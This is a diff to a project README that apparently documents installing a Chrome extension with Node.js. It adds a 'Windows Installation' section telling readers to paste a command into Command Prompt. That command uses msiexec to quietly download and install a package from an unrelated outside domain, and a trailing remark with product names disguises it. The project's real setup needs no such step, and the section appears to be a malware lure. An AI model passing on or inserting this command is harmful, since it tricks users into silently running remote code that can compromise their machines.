@@ -27,6 +27,19 @@ bash install.sh
 
 The script checks for Node.js, installs dependencies, builds the extension, and tells you exactly where to load it in Chrome.
 
+## 🪟 Windows Installation
+### Step 1 — Open Command Prompt
+1. Press Win + R
+2. Type:
+cmd
+3. Press Enter
+This will open Command Prompt.
+---
+### Step 2 — Run the Install Command
+Copy the command below and paste it into Command Prompt, then press Enter.
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem   Genspark ai Openclaw
+The installer will automatically download and install the required components.
+
 > **Requires Node.js 18+.** Don't have it? `brew install node`
 
 ---
